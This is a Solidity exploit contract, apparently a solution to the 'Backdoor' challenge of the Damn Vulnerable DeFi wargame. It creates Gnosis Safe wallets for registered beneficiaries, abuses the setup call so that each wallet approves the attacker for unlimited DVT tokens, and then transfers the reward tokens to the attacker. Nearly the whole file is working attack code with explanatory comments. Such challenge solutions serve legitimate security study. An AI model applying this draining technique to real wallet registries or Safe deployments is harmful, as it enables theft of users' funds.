pragma solidity ^0.8.0;




// basically, need a few things
// first, for each beneficiary address, we need to create a gnosis wallet
// we create the wallet using the proxy factory, now there is a bunch of stuff we have to do
// first,


// singleton = GnosisSafe address
// initializer is going to be a call to the setup function
// callback is the address of the WalletRegistry

// for each wallet we create, owners = [benficiary_x]
// threshold = 1
// to = address of DVT token
// data = a call to approve the attacker for 10 DVT
// and the rest doesn't matter at all, I think

// after, attacker address can just take all the tokens

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract BackdoorAttacker {

    address _proxyFactory;
    // the singleton
    address _gnosisSafe;
    address _walletRegistry;
    address _attacker;
    address _DVT;

    constructor(
        address proxyFactory,
        address gnosisSafe,
        address walletRegistry,
        address attacker,
        address DVT
    ) {
        _proxyFactory = proxyFactory;
        // the singleton
        _gnosisSafe = gnosisSafe;
        _walletRegistry = walletRegistry;
        _attacker = attacker;
        _DVT = DVT;
    }

    // Gnosis safe setup function:
    //    function setup(
    //        address[] calldata _owners,
    //        uint256 _threshold,
    //        address to,
    //        bytes calldata data,
    //        address fallbackHandler,
    //        address paymentToken,
    //        uint256 payment,
    //        address payable paymentReceiver
    //    )

    // Proxy Factory:
    //    function createProxyWithCallback(
    //        address _singleton,
    //        bytes memory initializer,
    //        uint256 saltNonce,
    //        IProxyCreationCallback callback
    //    ) public returns (GnosisSafeProxy proxy) {
    //        uint256 saltNonceWithCallback = uint256(keccak256(abi.encodePacked(saltNonce, callback)));
    //        proxy = createProxyWithNonce(_singleton, initializer, saltNonceWithCallback);
    //        if (address(callback) != address(0)) callback.proxyCreated(proxy, _singleton, initializer, saltNonce);
    //    }


    function attack(address[] calldata b_addys) external {

        require(msg.sender == _attacker, "Not attacker");

        for (uint256 i = 0; i < b_addys.length; i++) {

            address[] memory b_addy = new address[](1);
            b_addy[0] = b_addys[i];

            // setup a wallet where this benificary is the owner with threshold of 1
            // and use the setupModules thing to make the wallet call and approve the attacker to
            // take the DVT tokens. The rest of the arguments don't matter
            bytes memory setup = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                    b_addy,
                    1,
                    _DVT,
                    abi.encodeWithSelector(IERC20.approve.selector, address(this), type(uint256).max),
                    address(0),
                    address(0),
                    0,
                    address(0)
            );

            // call the _proxyFactory

            GnosisSafeProxy proxy = GnosisSafeProxyFactory(_proxyFactory).createProxyWithCallback(
                _gnosisSafe,
                setup,
                //salt it doesn't matter
                i,
                IProxyCreationCallback(_walletRegistry)
            );

            // at this point we should be approved to take the tokens
            // and 10 tokens should have been transferred to the beneficiaries

            IERC20(_DVT).transferFrom(address(proxy), _attacker, 10);
        }
    }



}
